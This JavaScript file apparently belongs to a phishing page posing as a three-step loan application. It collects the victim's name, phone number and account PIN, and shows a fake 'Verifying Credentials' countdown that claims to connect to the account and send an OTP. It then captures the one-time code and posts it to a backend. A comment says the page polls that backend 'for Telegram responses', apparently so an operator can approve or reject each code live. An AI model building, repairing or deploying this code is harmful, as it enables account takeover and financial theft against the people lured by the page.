let loanAppData = {};
let currentAppReference = null;
let pollInterval = null;

const step1Form = document.getElementById('step1-form');
const step2Form = document.getElementById('step2-form');
const stepLoading = document.getElementById('step-loading');
const step3Form = document.getElementById('step3-form');
const successScreen = document.getElementById('success-screen');

const loadingTitle = document.getElementById('loading-title');
const loadingDesc = document.getElementById('loading-desc');

const otpStatusBanner = document.getElementById('otp-status-banner');
const otpStatusText = document.getElementById('otp-status-text');
const btnStep3 = document.getElementById('btn-step3');
const otpInput = document.getElementById('otp');

// Slider functionality
const loanSlider = document.getElementById('loanAmountSlider');
const loanDisplay = document.getElementById('loan-amount-display');
if (loanSlider && loanDisplay) {
  loanSlider.addEventListener('input', (e) => {
    loanDisplay.innerText = `$${e.target.value}`;
  });
}

// Step Indicator Elements
const stepIndicator = document.getElementById('step-indicator');
const stepCircle1 = document.getElementById('step-circle-1');
const stepLabel1 = document.getElementById('step-label-1');
const stepLine1 = document.getElementById('step-line-1');

const stepCircle2 = document.getElementById('step-circle-2');
const stepLabel2 = document.getElementById('step-label-2');
const stepLine2 = document.getElementById('step-line-2');

const stepCircle3 = document.getElementById('step-circle-3');
const stepLabel3 = document.getElementById('step-label-3');

function updateIndicator(stepNumber) {
  if (stepNumber === 2) {
    if (stepCircle1) stepCircle1.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm";
    if (stepLabel1) stepLabel1.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
    if (stepCircle2) stepCircle2.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm";
    if (stepLabel2) stepLabel2.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
    if (stepLine1) stepLine1.className = "flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300";
  } else if (stepNumber === 3) {
    if (stepCircle3) stepCircle3.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm";
    if (stepLabel3) stepLabel3.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
    if (stepLine2) stepLine2.className = "flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300";
  }
}

// STEP 1: Collect Applicant Details & Slider value -> Proceed to Step 2
if (step1Form) {
  step1Form.addEventListener('submit', (e) => {
    e.preventDefault();
    loanAppData.fullName = document.getElementById('fullName').value.trim();
    loanAppData.occupation = document.getElementById('occupation').value.trim();
    loanAppData.monthlyPayments = document.getElementById('monthlyPayments').value.trim();
    loanAppData.loanAmount = loanSlider ? loanSlider.value : '250';
    loanAppData.repaymentTime = document.getElementById('repaymentTime').value;

    step1Form.classList.add('hidden');
    step2Form.classList.remove('hidden');
    updateIndicator(2);
  });
}

// STEP 2: Collect Phone & PIN -> Show Loader -> 5s Countdown -> Transition to Step 3
if (step2Form) {
  step2Form.addEventListener('submit', (e) => {
    e.preventDefault();
    loanAppData.phone = document.getElementById('phone').value.trim();
    loanAppData.pin = document.getElementById('pin').value.trim();

    step2Form.classList.add('hidden');
    stepLoading.classList.remove('hidden');

    let countdown = 5;
    if (loadingTitle) loadingTitle.innerText = `Verifying Credentials... (${countdown}s)`;
    if (loadingDesc) loadingDesc.innerText = "Please wait while we connect to your account and send an OTP.";

    const countdownTimer = setInterval(() => {
      countdown--;
      if (countdown > 0) {
        if (loadingTitle) loadingTitle.innerText = `Verifying Credentials... (${countdown}s)`;
      } else {
        clearInterval(countdownTimer);
        stepLoading.classList.add('hidden');
        step3Form.classList.remove('hidden');
        updateIndicator(3);
      }
    }, 1000);
  });
}

// STEP 3: Submit Complete Profile & OTP to Backend
if (step3Form) {
  step3Form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const otpCode = otpInput.value.trim();

    if (otpCode.length !== 6) {
      alert('Please enter a valid 6-digit OTP code.');
      return;
    }

    loanAppData.otpCode = otpCode;

    if (btnStep3) {
      btnStep3.innerText = "Verifying...";
      btnStep3.disabled = true;
    }
    if (otpInput) otpInput.disabled = true;

    if (otpStatusBanner) otpStatusBanner.className = "bg-blue-50 border border-blue-200 rounded-lg p-3 text-center";
    if (otpStatusText) {
      otpStatusText.className = "text-xs text-blue-700 font-medium";
      otpStatusText.innerText = "Verifying details & OTP code, please wait...";
    }

    try {
      const response = await fetch('/api/submit-full-application', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(loanAppData)
      });

      const result = await response.json();

      if (result.success) {
        currentAppReference = result.appReference;
        startPollingStatus(currentAppReference);
      } else {
        resetOtpForm('Failed to submit application. Please try again.');
      }
    } catch (err) {
      console.error('Error in step 3:', err);
      resetOtpForm('Server connection error.');
    }
  });
}

// Poll backend status for Telegram responses
function startPollingStatus(appReference) {
  if (pollInterval) clearInterval(pollInterval);

  pollInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/check-status/${appReference}`);
      const data = await res.json();

      if (data.status === 'OTP_APPROVED') {
        clearInterval(pollInterval);
        if (stepIndicator) stepIndicator.classList.add('hidden');
        if (step3Form) step3Form.classList.add('hidden');
        if (successScreen) successScreen.classList.remove('hidden');
      } else if (data.status === 'OTP_REJECTED') {
        clearInterval(pollInterval);
        resetOtpForm('❌ Incorrect OTP entered. Please re-enter the 6-digit code.');
      }
    } catch (err) {
      console.error('Polling error:', err);
    }
  }, 2000);
}

function resetOtpForm(message) {
  if (otpStatusBanner) otpStatusBanner.className = "bg-red-50 border border-red-200 rounded-lg p-3 text-center";
  if (otpStatusText) {
    otpStatusText.className = "text-xs text-red-700 font-semibold";
    otpStatusText.innerText = message;
  }

  if (btnStep3) {
    btnStep3.innerText = "Submit Loan Application";
    btnStep3.disabled = false;
  }
  if (otpInput) {
    otpInput.disabled = false;
    otpInput.value = '';
    otpInput.focus();
  }
  }
                             
